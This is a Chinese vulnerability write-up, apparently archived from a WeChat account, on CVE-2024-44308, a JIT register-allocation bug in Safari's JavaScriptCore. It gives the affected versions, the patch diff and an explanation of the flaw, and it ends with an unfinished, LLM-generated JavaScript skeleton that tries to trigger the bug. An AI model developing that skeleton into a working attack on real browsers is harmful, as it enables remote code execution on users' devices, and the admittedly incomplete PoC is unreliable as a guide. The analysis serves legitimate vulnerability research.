@@ -1,0 +1,154 @@
+---
+cve: "CVE-2024-44308"
+source: "gelusus/wxvl 公众号漏洞文库"
+---
+
+#  [漏洞] CVE-2024-44308：Apple Safari JavaScriptCore 远程代码执行漏洞   
+ Ots安全   2024-12-06 10:09  
+  
+![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
+  
+**概括：**  
+- CVE 编号：CVE-2024-44308  
+  
+- 目标软件：Apple Safari（iOS、visionOS、macOS）  
+  
+- 受影响的版本：iOS 17.7.1、18.1、visionOS 2.1、macOS Sequoia 15.1  
+  
+- 修补版本：iOS 17.7.2、18.1.1、visionOS 2.1.1、macOS Sequoia 15.1.1  
+  
+- 影响：远程代码执行  
+  
+- 记者：Google 威胁分析小组的Clément Lecigne和Benoît Sevens  
+  
+- 分析员：韩国大学 USELab的Dohyun Lee (@l33d0hyun)  
+  
+**技术细节：**  
+  
+**概述：**  
+- WebKit 的 DFG JIT 编译器中的这个漏洞涉及由于scratch2GPR寄存器分配时间不当而导致的寄存器损坏问题。  
+  
+**分析：**  
+  
+```
+diff --git a/Source/JavaScriptCore/dfg/DFGSpeculativeJIT.cpp b/Source/JavaScriptCore/dfg/DFGSpeculativeJIT.cpp
+index 356d52b21a120..d041b63e8ba98 100644
+--- a/Source/JavaScriptCore/dfg/DFGSpeculativeJIT.cpp
++++ b/Source/JavaScriptCore/dfg/DFGSpeculativeJIT.cpp
+@@ -3528,6 +3528,14 @@ void SpeculativeJIT::compilePutByValForIntTypedArray(Node* node, TypedArrayType
+        }
+    }
+
++ GPRReg scratch2GPR = InvalidGPRReg;
++#if USE(JSVALUE64)
++ if (node->arrayMode().mayBeResizableOrGrowableSharedTypedArray()) {
++ scratch2.emplace(this);
++ scratch2GPR = scratch2->gpr();
++ }
++#endif
++
+    bool result = getIntTypedArrayStoreOperand(
+        value, propertyReg,
+#if USE(JSVALUE32_64)
+@@ -3539,14 +3547,6 @@ void SpeculativeJIT::compilePutByValForIntTypedArray(Node* node, TypedArrayType
+        return;
+    }
+
+- GPRReg scratch2GPR = InvalidGPRReg;
+-#if USE(JSVALUE64)
+- if (node->arrayMode().mayBeResizableOrGrowableSharedTypedArray()) {
+- scratch2.emplace(this);
+- scratch2GPR = scratch2->gpr();
+- }
+-#endif
+-
+    GPRReg valueGPR = value.gpr();
+    GPRReg scratchGPR = scratch.gpr();
+#if USE(JSVALUE32_64)
+```  
+  
+- WebKit 提交：53e7f27d262249310bd6b7ad452e7df334c92b7d .diff  
+  
+- 此漏洞已按上图所示进行了修补。在修补前的代码中，在添加一条慢速路径后，存在一个潜在的寄存器滥用问题，其中scratch2GPR分配了getIntTypedArrayStoreOperand()。这可能导致以下问题：  
+  
+- 在慢速路径之后分配 DFG 寄存器意味着如果采用慢速路径，我们将不必要地分配寄存器，最终导致全局状态不一致。  
+  
+- 在这种特定情况下，如果getIntTypedArrayStoreOperand()添加了一条慢速路径，scratch2GPR则即使它不会在慢速路径中使用，也会在那之后被分配。  
+  
+- 代码流程：  
+  
+- 调用getIntTypedArrayStoreOperand()-> 添加慢速路径 -> 错误分配scratch2GPR-> 如果采用慢速路径，则寄存器状态不一致  
+  
+**概念验证（未完成）：**  
+- 这不是一个完全开发的 PoC，但它使我们能够实现我们需要触发的功能：SpeculativeJIT::compilePutByValForIntTypedArray和getIntTypedArrayStoreOperand()。  
+  
+- 这个骨架代码是由 生成的代码LLM (Large Language Model)。  
+  
+```
+var ab = new ArrayBuffer(8);
+var arr = new Int32Array(ab);
+
+const confuser = {
+    valueOf() {
+        gc();
+        if (this.flag) {
+            return {x: 0x41414141};
+        }
+        return 0x1234;
+    },
+    flag: false
+};
+
+function jitMe(arr) {
+    let x = 0;
+    for(let i = 0; i < 10000; i++) {
+        if(i % 100 === 0) {
+            confuser.flag = !confuser.flag;
+            x = confuser;
+        } else {
+            x = i & 0xff;
+        }
+        arr[(i & 0xffff)] = x;
+    }
+    return arr;
+}
+
+for(let i = 0; i < 100; i++) {
+    jitMe(arr);
+}
+jitMe(arr);
+```  
+  
+  
+完整的 PoC 代码一旦完成将会更新。  
+  
+**附加信息：**  
+- 我觉得我可能会在下面的博客上找到有用的信息！它似乎有一些相似之处。  
+  
+https://blog.csdn.net/qq_61670993/article/details/137603280  
+  
+  
+  
+感谢您抽出  
+  
+![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
+  
+.  
+  
+![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
+  
+.  
+  
+![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
+  
+来阅读本文  
+  
+![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
+  
+**点它，分享点赞在看都在这里**  
+  
+
+
+---
+
+> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
